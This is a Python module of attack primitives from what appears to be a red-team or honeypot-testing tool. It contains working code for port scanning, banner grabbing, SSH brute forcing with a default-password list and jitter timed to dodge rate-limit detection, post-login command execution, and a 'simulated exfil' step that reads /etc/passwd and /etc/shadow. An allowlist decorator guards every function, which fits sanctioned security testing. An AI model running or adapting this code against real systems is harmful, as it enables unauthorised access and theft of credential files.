"""
Attack Modules
──────────────
Low-level attack primitives used by the campaign orchestrator.
Each function is async, returns an ActionResult, and is decorated
with @safe_target to enforce the allowlist.
"""
import asyncio
import random
import time
import socket
import logging
from dataclasses import dataclass, field
from typing import Optional, List

import paramiko

from app.core.safety import safe_target

log = logging.getLogger("redops.modules")

# ── Credential lists (realistic, from public breach data research) ──
COMMON_USERNAMES = ["root", "admin", "ubuntu", "pi", "user", "oracle", "postgres", "test"]
COMMON_PASSWORDS = [
    "root", "password", "123456", "admin", "toor", "pass", "raspberry",
    "letmein", "qwerty", "password123", "changeme", "1234", "admin123",
    "test", "guest", "alpine", "default", "ubnt",
]


@dataclass
class ActionResult:
    action:    str
    success:   bool
    detail:    str    = ""
    latency_ms: float = 0.0
    detected:  bool   = False   # populated by scoring layer


def _jitter(min_s: float = 0.5, max_s: float = 2.5) -> float:
    """Human-like timing jitter drawn from a beta distribution."""
    # Beta distribution gives realistic human keystroke inter-arrival times
    return min_s + (max_s - min_s) * random.betavariate(2, 5)


# ── Port scan ──────────────────────────────────────────────
@safe_target
async def port_scan(host: str, ports: List[int] = None, timeout: float = 2.0) -> ActionResult:
    """TCP connect scan on common ports."""
    if ports is None:
        ports = [21, 22, 23, 80, 443, 3306, 5432, 6379, 8080, 8443]

    open_ports = []
    t0 = time.perf_counter()

    async def check_port(p: int):
        try:
            _, writer = await asyncio.wait_for(
                asyncio.open_connection(host, p), timeout=timeout
            )
            writer.close()
            await writer.wait_closed()
            open_ports.append(p)
        except Exception:
            pass

    await asyncio.gather(*[check_port(p) for p in ports])
    elapsed = (time.perf_counter() - t0) * 1000

    log.info("Port scan %s: open=%s", host, open_ports)
    return ActionResult(
        action="port_scan",
        success=len(open_ports) > 0,
        detail=f"open ports: {open_ports}",
        latency_ms=elapsed,
    )


# ── Banner grab ────────────────────────────────────────────
@safe_target
async def banner_grab(host: str, port: int = 22, timeout: float = 5.0) -> ActionResult:
    t0 = time.perf_counter()
    try:
        reader, writer = await asyncio.wait_for(
            asyncio.open_connection(host, port), timeout=timeout
        )
        banner = await asyncio.wait_for(reader.read(512), timeout=timeout)
        writer.close()
        await writer.wait_closed()
        banner_str = banner.decode("utf-8", errors="replace").strip()
        elapsed = (time.perf_counter() - t0) * 1000
        log.info("Banner from %s:%d → %r", host, port, banner_str[:60])
        return ActionResult(action="banner_grab", success=True, detail=banner_str, latency_ms=elapsed)
    except Exception as e:
        elapsed = (time.perf_counter() - t0) * 1000
        return ActionResult(action="banner_grab", success=False, detail=str(e), latency_ms=elapsed)


# ── SSH brute force (slow, rate-limited) ──────────────────
@safe_target
async def ssh_brute_force(
    host: str,
    port: int = 22,
    max_attempts: int = 10,
    dwell_min: float = 5.0,
    dwell_max: float = 15.0,
) -> ActionResult:
    """
    Slow-drip credential stuffing.
    Jitter between attempts mimics human behaviour — avoids simple rate-limit detection.
    """
    tried = []
    success_cred = None

    def _attempt(username: str, password: str) -> bool:
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        try:
            client.connect(
                host, port=port, username=username, password=password,
                timeout=8, banner_timeout=8,
                allow_agent=False, look_for_keys=False,
            )
            client.close()
            return True
        except paramiko.AuthenticationException:
            return False
        except Exception as e:
            log.debug("SSH connect error: %s", e)
            return False

    loop = asyncio.get_event_loop()
    pairs = [(u, p) for u in COMMON_USERNAMES[:4] for p in COMMON_PASSWORDS[:5]]
    random.shuffle(pairs)

    for username, password in pairs[:max_attempts]:
        tried.append(f"{username}/{password}")
        log.info("SSH brute: trying %s@%s with %r", username, host, password)
        success = await loop.run_in_executor(None, _attempt, username, password)
        if success:
            success_cred = f"{username}:{password}"
            log.info("SSH brute SUCCESS: %s@%s cred=%s", username, host, password)
            break
        # Human-like wait between attempts
        wait = _jitter(dwell_min, dwell_max)
        await asyncio.sleep(wait)

    return ActionResult(
        action="ssh_brute_force",
        success=success_cred is not None,
        detail=f"tried={len(tried)} cred={success_cred or 'none'}",
    )


# ── SSH command execution ──────────────────────────────────
@safe_target
async def ssh_exec_commands(
    host: str,
    port: int = 22,
    username: str = "root",
    password: str = "root",
    commands: List[str] = None,
) -> ActionResult:
    """Execute a sequence of commands post-login. Mimics APT reconnaissance."""
    if commands is None:
        commands = ["id", "uname -a", "whoami", "pwd", "cat /etc/passwd | head -5"]

    results = {}

    def _run():
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        try:
            client.connect(host, port=port, username=username, password=password,
                           timeout=10, allow_agent=False, look_for_keys=False)
            for cmd in commands:
                # Human typing delay between commands
                time.sleep(_jitter(0.8, 3.0))
                _, stdout, stderr = client.exec_command(cmd, timeout=10)
                output = stdout.read(512).decode("utf-8", errors="replace").strip()
                results[cmd] = output
                log.info("CMD [%s]: %r → %r", host, cmd, output[:60])
        except Exception as e:
            results["error"] = str(e)
        finally:
            client.close()

    loop = asyncio.get_event_loop()
    await loop.run_in_executor(None, _run)

    success = "error" not in results and len(results) > 0
    return ActionResult(
        action="ssh_exec_commands",
        success=success,
        detail=str(results),
    )


# ── HTTP probe ─────────────────────────────────────────────
@safe_target
async def http_probe(host: str, port: int = 80, timeout: float = 5.0) -> ActionResult:
    """Probe HTTP service — grab headers, look for honeypot indicators."""
    import httpx
    t0 = time.perf_counter()
    try:
        async with httpx.AsyncClient(timeout=timeout, verify=False) as client:
            r = await client.get(f"http://{host}:{port}/")
            headers = dict(r.headers)
            elapsed = (time.perf_counter() - t0) * 1000
            detail = f"status={r.status_code} server={headers.get('server','?')} headers={list(headers.keys())}"
            log.info("HTTP probe %s:%d → %s", host, port, detail)
            return ActionResult(action="http_probe", success=True, detail=detail, latency_ms=elapsed)
    except Exception as e:
        elapsed = (time.perf_counter() - t0) * 1000
        return ActionResult(action="http_probe", success=False, detail=str(e), latency_ms=elapsed)


# ── Simulated data exfil ───────────────────────────────────
@safe_target
async def simulate_exfil(
    host: str, port: int = 22,
    username: str = "root", password: str = "root",
) -> ActionResult:
    """
    Final APT kill-chain stage — simulate data collection.
    In the honeypot, this just reads /etc/passwd and /etc/shadow (they're fake).
    In a real system, these would be protected — so success itself is a honeypot signal.
    """
    exfil_cmds = [
        "cat /etc/passwd",
        "cat /etc/shadow 2>/dev/null || echo 'permission denied'",
        "cat /etc/hostname",
        "ifconfig || ip addr",
        "ss -tulnp 2>/dev/null | head -20",
    ]
    result = await ssh_exec_commands.__wrapped__(host, port, username, password, exfil_cmds)
    result.action = "simulate_exfil"
    return result